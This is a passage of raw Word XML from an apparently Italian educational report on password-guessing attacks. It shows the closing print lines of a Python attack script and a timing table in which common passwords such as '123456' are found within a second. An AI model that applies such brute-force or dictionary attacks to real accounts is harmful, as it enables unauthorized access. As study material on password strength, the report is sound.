                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>trovata</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: {found}")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"Tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>effettuati</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: {</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>}")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"Tempo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>totale</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: {total:.2f} secondi")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t>else:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print("ATTACCO FALLITO")</w:t>
            </w:r>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:br/>
              <w:t xml:space="preserve">    print(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"Tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>effettuati</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>: {</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E07933">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="44FB1A42" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="00E07933" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="46237C16" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DC28C1F" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB29983" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B054C5" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BAC99FF" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44843171" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54B93137" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B6E0021" w14:textId="60BF6D51" w:rsidR="00E07933" w:rsidRDefault="00E07933" w:rsidP="00E07933">
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Analisi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> delle </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E07933">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tempistiche</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="11340" w:type="dxa"/>
        <w:tblInd w:w="-459" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2484"/>
        <w:gridCol w:w="2023"/>
        <w:gridCol w:w="1986"/>
        <w:gridCol w:w="1987"/>
        <w:gridCol w:w="2860"/>
      </w:tblGrid>
      <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="2E8B5380" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DDEBF7"/>
          </w:tcPr>
          <w:p w14:paraId="52F0826D" w14:textId="29653C7B" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Livello</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> di </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>sicurezza</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2023" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DDEBF7"/>
          </w:tcPr>
          <w:p w14:paraId="6FC872E0" w14:textId="0E83C84C" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Esempio</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1986" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DDEBF7"/>
          </w:tcPr>
          <w:p w14:paraId="77EBEF10" w14:textId="461E51DB" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Numero</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> di tentative</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1987" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DDEBF7"/>
          </w:tcPr>
          <w:p w14:paraId="313F2409" w14:textId="00ADC0E9" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Tempo stimato</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2860" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DDEBF7"/>
          </w:tcPr>
          <w:p w14:paraId="5E564469" w14:textId="009B4CBD" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Efficacia</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>dell’attacco</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="32C71537" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="320F29CC" w14:textId="51E42175" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Pessimo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> (top 100 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>comuni</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20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0F19" w:rsidRPr="002F0F19" w14:paraId="740220D5" w14:textId="77777777">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w14:paraId="621252DF" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="18"/>
                      <w:szCs w:val="18"/>
                      <w:lang w:val="it-IT"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w14:paraId="10B273D5" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:vanish/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-I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tblGrid>
            <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="4310C643" w14:textId="77777777">
              <w:trPr>
                <w:tblCellSpacing w:w="15" w:type="dxa"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="0" w:type="auto"/>
                  <w:vAlign w:val="center"/>
                  <w:hideMark/>
                </w:tcPr>
                <w:p w14:paraId="29126DF3" w14:textId="2C05E055" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
                  <w:pPr>
                    <w:rPr>
                      <w:sz w:val="18"/>
                      <w:szCs w:val="18"/>
                      <w:lang w:val="it-IT"/>
                    </w:rPr>
                  </w:pPr>
                  <w:proofErr w:type="gramStart"/>
                  <w:r w:rsidRPr="002F0F19">
                    <w:rPr>
                      <w:sz w:val="18"/>
                      <w:szCs w:val="18"/>
                      <w:lang w:val="it-IT"/>
                    </w:rPr>
                    <w:t>123456,password</w:t>
                  </w:r>
                  <w:proofErr w:type="gramEnd"/>
                  <w:r w:rsidRPr="002F0F19">
                    <w:rPr>
                      <w:sz w:val="18"/>
                      <w:szCs w:val="18"/>
                      <w:lang w:val="it-IT"/>
                    </w:rPr>
                    <w:t>, admin</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w14:paraId="0AC337DA" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1986" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E425745" w14:textId="14DDF1B1" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1987" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="521AF14B" w14:textId="6245D2EA" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>0.84 secondi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2860" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EA7B491" w14:textId="65E486BF" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Praticamente</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>garantito</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">: le password </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>più</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>comuni</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>vengono</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>trovate</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>immediatamente</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002F0F19" w:rsidRPr="002F0F19" w14:paraId="4C988E1B" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2484" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A85A03F" w14:textId="4C9E28FE" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="00E07933">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
